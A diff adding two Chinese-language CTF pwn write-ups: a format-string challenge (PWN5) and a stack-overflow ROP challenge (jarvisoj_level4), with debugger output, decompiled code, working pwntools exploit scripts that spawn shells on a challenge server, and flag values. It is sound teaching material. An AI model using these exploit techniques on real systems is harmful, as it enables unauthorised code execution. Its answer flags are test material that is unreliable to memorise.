@@ -5476,6 +5476,304 @@ io.interactive()
 
 ------
 
+### ♥ [[第五空间2019 决赛]PWN5](https://ce.pwnthebox.com/challenges?id=369)
+
+先`file ./PWN51  `查看文件类型，再`checksec --file=./PWN51  `检查文件保护情况。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
+└─$ file ./PWN51
+./PWN51: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6a8aa744920dda62e84d44fcc440c05f31c4c23d, stripped
+
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
+└─$ checksec --file=./PWN51
+[*] '/home/tyd/ctf/pwn/pwnthebox/PWN51'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+用`IDA Pro 32bit`打开`PWN51`后按`F5`反汇编源码并查看主函数。程序首先生成一个随机值并读取到在`.bss`段存储的`dword_804C044`变量中，然后将用户输入读取到`buf`变量中并进行输出，`buf`变量长度为`0x70`字节，`read`函数读取时限制的输入为`0x63`字节，并不存在栈溢出漏洞，但是`printf`函数存在格式化字符串漏洞。接着将用户的下个输入读取到`nptr`变量中，如果`nptr`变量转换成整型后的数值，和`.bss:0804C044`字段中`dword_804C044`变量保存的随机值相等，即可获取到靶机的`shell`权限。
+
+```c
+int __cdecl main(int a1)
+{
+  unsigned int v1; // eax
+  int result; // eax
+  int fd; // [esp+0h] [ebp-84h]
+  char nptr[16]; // [esp+4h] [ebp-80h] BYREF
+  char buf[100]; // [esp+14h] [ebp-70h] BYREF
+  unsigned int v6; // [esp+78h] [ebp-Ch]
+  int *v7; // [esp+7Ch] [ebp-8h]
+
+  v7 = &a1;
+  v6 = __readgsdword(0x14u);
+  setvbuf(stdout, 0, 2, 0);
+  v1 = time(0);
+  srand(v1);
+  fd = open("/dev/urandom", 0);
+  read(fd, &dword_804C044, 4u);
+  printf("your name:");
+  read(0, buf, 0x63u);
+  printf("Hello,");
+  printf(buf);
+  printf("your passwd:");
+  read(0, nptr, 0xFu);
+  if ( atoi(nptr) == dword_804C044 )
+  {
+    puts("ok!!");
+    system("/bin/sh");
+  }
+  else
+  {
+    puts("fail");
+  }
+  result = 0;
+  if ( __readgsdword(0x14u) != v6 )
+    sub_80493D0();
+  return result;
+}
+```
+
+使用`gdb ./pwn`对程序进行调试，这里我用的是`pwndbg`，在`printf`处设置断点`b printf`，`run`运行程序后使用`stack 20`查看栈，可以得知格式化字符串的偏移量是`10`。
+
+```bash
+pwndbg> b printf
+Breakpoint 1 at 0x8049040
+pwndbg> run
+Starting program: /home/tyd/ctf/pwn/buuctf/pwn 
+
+Breakpoint 1, __printf (format=0x804a015 "your name:") at printf.c:32
+32      printf.c: 没有那个文件或目录.
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+───────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────
+ EAX  0x804a015 ◂— 'your name:'
+ EBX  0x804c000 —▸ 0x804bf10 ◂— 0x1
+ ECX  0x804c044 ◂— 0xf2df338f
+ EDX  0x4
+ EDI  0x80490e0 ◂— xor    ebp, ebp
+ ESI  0x1
+ EBP  0xffffd108 ◂— 0x0
+ ESP  0xffffd06c —▸ 0x804928d ◂— add    esp, 0x10
+ EIP  0xf7e08f10 (printf) ◂— call   0xf7efa189
+────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────
+ ► 0xf7e08f10 <printf>       call   __x86.get_pc_thunk.ax                    <__x86.get_pc_thunk.ax>
+        arg[0]: 0x804928d ◂— add    esp, 0x10
+        arg[1]: 0x804a015 ◂— 'your name:'
+        arg[2]: 0x804c044 ◂— 0xf2df338f
+        arg[3]: 0x4
+ 
+   0xf7e08f15 <printf+5>     add    eax, 0x19a0df
+   0xf7e08f1a <printf+10>    sub    esp, 0xc
+   0xf7e08f1d <printf+13>    lea    edx, [esp + 0x14]
+   0xf7e08f21 <printf+17>    push   0
+   0xf7e08f23 <printf+19>    push   edx
+   0xf7e08f24 <printf+20>    push   dword ptr [esp + 0x18]
+   0xf7e08f28 <printf+24>    mov    eax, dword ptr [eax - 0x60]
+   0xf7e08f2e <printf+30>    push   dword ptr [eax]
+   0xf7e08f30 <printf+32>    call   __vfprintf_internal                    <__vfprintf_internal>
+ 
+   0xf7e08f35 <printf+37>    add    esp, 0x1c
+───────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────
+00:0000│ esp 0xffffd06c —▸ 0x804928d ◂— add    esp, 0x10
+01:0004│     0xffffd070 —▸ 0x804a015 ◂— 'your name:'
+02:0008│     0xffffd074 —▸ 0x804c044 ◂— 0xf2df338f
+03:000c│     0xffffd078 ◂— 0x4
+04:0010│     0xffffd07c ◂— 0x0
+05:0014│     0xffffd080 —▸ 0xf7ffdb30 —▸ 0xf7fc33f0 —▸ 0xf7ffd9d0 ◂— 0x0
+06:0018│     0xffffd084 ◂— 0x3
+07:001c│     0xffffd088 —▸ 0xf7fc3420 —▸ 0x804837f ◂— 'GLIBC_2.0'
+──────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────
+ ► f 0 0xf7e08f10 printf
+   f 1 0x804928d
+   f 2 0xf7dd3905 __libc_start_main+229
+   f 3 0x8049112
+────────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg> c
+Continuing.
+your name:AAAA   
+
+Breakpoint 1, __printf (format=0x804a020 "Hello,") at printf.c:32
+32      in printf.c
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+───────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────
+*EAX  0x804a020 ◂— 'Hello,'
+ EBX  0x804c000 —▸ 0x804bf10 ◂— 0x1
+*ECX  0xffffd098 ◂— 'AAAA\n'
+*EDX  0x63
+ EDI  0x80490e0 ◂— xor    ebp, ebp
+ ESI  0x1
+ EBP  0xffffd108 ◂— 0x0
+ ESP  0xffffd06c —▸ 0x80492b2 ◂— add    esp, 0x10
+ EIP  0xf7e08f10 (printf) ◂— call   0xf7efa189
+───────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────
+ ► 0xf7e08f10 <printf>       call   __x86.get_pc_thunk.ax                    <__x86.get_pc_thunk.ax>
+        arg[0]: 0x80492b2 ◂— add    esp, 0x10
+        arg[1]: 0x804a020 ◂— 'Hello,'
+        arg[2]: 0xffffd098 ◂— 'AAAA\n'
+        arg[3]: 0x63
+ 
+   0xf7e08f15 <printf+5>     add    eax, 0x19a0df
+   0xf7e08f1a <printf+10>    sub    esp, 0xc
+   0xf7e08f1d <printf+13>    lea    edx, [esp + 0x14]
+   0xf7e08f21 <printf+17>    push   0
+   0xf7e08f23 <printf+19>    push   edx
+   0xf7e08f24 <printf+20>    push   dword ptr [esp + 0x18]
+   0xf7e08f28 <printf+24>    mov    eax, dword ptr [eax - 0x60]
+   0xf7e08f2e <printf+30>    push   dword ptr [eax]
+   0xf7e08f30 <printf+32>    call   __vfprintf_internal                    <__vfprintf_internal>
+ 
+   0xf7e08f35 <printf+37>    add    esp, 0x1c
+────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────
+00:0000│ esp 0xffffd06c —▸ 0x80492b2 ◂— add    esp, 0x10
+01:0004│     0xffffd070 —▸ 0x804a020 ◂— 'Hello,'
+02:0008│     0xffffd074 —▸ 0xffffd098 ◂— 'AAAA\n'
+03:000c│     0xffffd078 ◂— 0x63 /* 'c' */
+04:0010│     0xffffd07c ◂— 0x0
+05:0014│     0xffffd080 —▸ 0xf7ffdb30 —▸ 0xf7fc33f0 —▸ 0xf7ffd9d0 ◂— 0x0
+06:0018│     0xffffd084 ◂— 0x3
+07:001c│     0xffffd088 —▸ 0xf7fc3420 —▸ 0x804837f ◂— 'GLIBC_2.0'
+────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────
+ ► f 0 0xf7e08f10 printf
+   f 1 0x80492b2
+   f 2 0xf7dd3905 __libc_start_main+229
+   f 3 0x8049112
+────────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg> stack 20
+00:0000│ esp 0xffffd06c —▸ 0x80492b2 ◂— add    esp, 0x10
+01:0004│     0xffffd070 —▸ 0x804a020 ◂— 'Hello,'
+02:0008│     0xffffd074 —▸ 0xffffd098 ◂— 'AAAA\n'
+03:000c│     0xffffd078 ◂— 0x63 /* 'c' */
+04:0010│     0xffffd07c ◂— 0x0
+05:0014│     0xffffd080 —▸ 0xf7ffdb30 —▸ 0xf7fc33f0 —▸ 0xf7ffd9d0 ◂— 0x0
+06:0018│     0xffffd084 ◂— 0x3
+07:001c│     0xffffd088 —▸ 0xf7fc3420 —▸ 0x804837f ◂— 'GLIBC_2.0'
+08:0020│     0xffffd08c ◂— 0x1
+09:0024│     0xffffd090 ◂— 0x0
+0a:0028│     0xffffd094 ◂— 0x1
+0b:002c│ ecx 0xffffd098 ◂— 'AAAA\n'
+0c:0030│     0xffffd09c ◂— 0xa /* '\n' */
+0d:0034│     0xffffd0a0 ◂— 0x0
+... ↓        5 skipped
+13:004c│     0xffffd0b8 —▸ 0xf7ffcff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x31f1c
+```
+
+知道格式化字符串漏洞的偏移量后，这题有两个解题思路：
+
+- 修改`dword_804C044`字段中的内容，这样能在`if`条件`atoi(nptr) == dword_804C044`为真时，成功执行`system("/bin/sh")`。
+- 利用`fmtstr_payload`将`atoi`函数地址修改为`system`函数地址，当输入的`nptr`为`/bin/sh`时，就能在`if`条件中的`atoi(nptr)`处成功执行`system("/bin/sh")`。
+
+第一种解法：利用格式化字符串`%n`的特性修改`dword_804C044`字段中的内容，`bss_addr = 0x804C044`共`4`个字节，我们先把这个地址写到栈偏移量为`10`的地址，然后利用`%10$n`把`0x804C044`的字节长度`4`写入到`%10$n`处指针所指的地址`0x804C044`中去，这样做的话，字段`dword_804C044`中的内容就修改成功了，最后输入的`nptr`为`4`时就能使`if`条件`atoi(nptr) == dword_804C044`为真，从而执行`system("/bin/sh")`获取到靶机的`shell`权限，输入`cat flag`可以得到`flag{d1aa727e-1027-4f25-a218-060c904ba5ce}`。
+
+```python
+from pwn import *
+
+context(arch='i386', os='linux', log_level='debug')
+io = remote('redirect.do-not-trust.hacking.run', 10247)
+bss_addr = 0x804C044
+payload = p32(bss_addr) + b'%10$n'
+io.sendline(payload)
+io.sendline(b'4')
+io.interactive()
+```
+
+第二种解法：在`Functions window`中看到有`system`函数，我们可以利用格式化字符串漏洞将`atoi`函数篡改为`system`函数，当用户在`"your passwd:"`后输入`/bin/sh`时，程序原来的`atoi(nptr)`就变成了`system("/bin/sh")`，从而获取到靶机的`shell`权限，输入`cat flag`可以得到`flag{d1aa727e-1027-4f25-a218-060c904ba5ce}`。
+
+```python
+from pwn import *
+
+context(arch='i386', os='linux', log_level='debug')
+io = remote('redirect.do-not-trust.hacking.run', 10247)
+e = ELF('./PWN51')
+atoi_got = e.got['atoi']
+system_plt = e.plt['system']
+payload = fmtstr_payload(10, {atoi_got: system_plt})
+io.sendline(payload)
+io.sendline(b'/bin/sh\x00')
+io.interactive()
+```
+
+------
+
+### [jarvisoj_level4](https://ce.pwnthebox.com/challenges?id=555)
+
+先`file ./level4`查看文件类型，再`checksec --file=./level4`检查文件保护情况。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
+└─$ file ./level4         
+./level4: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=44cfbcb6b7104566b4b70e843bc97c0609b7a018, not stripped
+
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
+└─$ checksec --file=./level4         
+[*] '/home/tyd/ctf/pwn/buuctf/level4'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+用`IDA Pro 32bit`打开附件`level4`，按`F5`反汇编源码并查看主函数。
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  vulnerable_function();
+  write(1, "Hello, World!\n", 0xEu);
+  return 0;
+}
+```
+
+双击进入`vulnerable_function()`函数可以看到该函数中有一个`char`型局部变量`buf`，可用栈大小只有`0x88`个字节，但是`read()`函数读取时限制输入到`buf`的字节为`0x100`，显然存在栈溢出漏洞。
+
+```c
+ssize_t vulnerable_function()
+{
+  char buf[136]; // [esp+0h] [ebp-88h] BYREF
+  return read(0, buf, 0x100u);
+}
+```
+
+`DynELF`函数能通过已知函数迅速查找`libc`库，并不需要我们知道`libc`文件的版本，也不像使用`LibcSearcher`那样需要选择`libc`的版本。`DynELF`函数的使用前提是程序中存在可以泄露libc信息的漏洞，并且漏洞可以被反复触发。我们利用`DynELF`函数泄露出`system`函数的地址后，还需要知道`/bin/sh`的地址，程序中并没有`/bin/sh`，所以`ROPgadget`无法找到。程序是`NX enabled`，即开启了堆栈不可执行，但`/bin/sh`是参数并不是要执行的函数。我们可以利用`read`函数把`/bin/sh`读入到程序的`.bss`段中，然后使用`system`函数调用即可得到靶机的`shell`。
+
+编写`Python`代码求解可得`flag{44724d0a-a417-431b-b012-bafca1d45411}`。
+
+```python
+from pwn import *
+
+context(arch='i386', os='linux', log_level='debug')
+io = remote('redirect.do-not-trust.hacking.run', 10248)
+elf = ELF('./level4')
+main_addr = elf.symbols['main']  # 0x8048470
+write_plt = elf.plt['write']  # 0x8048340
+read_plt = elf.plt['read']  # 0x8048310
+bss_addr = elf.bss()  # 0x804a024
+padding = b'a'*(0x88+0x4)
+
+def leak(address):
+    payload = padding + p32(write_plt) + p32(main_addr) + p32(1) + p32(address) + p32(4)
+    io.sendline(payload)
+    leaked = io.recv(4)
+    log.info("[%#x] => %s = %s" % (address, repr(leaked), hex(u32(leaked))))
+    return leaked
+
+
+libc = DynELF(leak, elf=elf)
+system_addr = libc.lookup('system', 'libc')
+log.success('system_address => %#x' % system_addr)
+payload = padding + p32(read_plt) + p32(main_addr) + p32(0) + p32(bss_addr) + p32(8)
+io.send(payload)
+io.send('/bin/sh\x00')
+payload = padding + p32(system_addr) + p32(main_addr) + p32(bss_addr)
+io.sendline(payload)
+io.interactive()
+```
+
+------
+
 ## Pwnable.kr
 
 ### fd
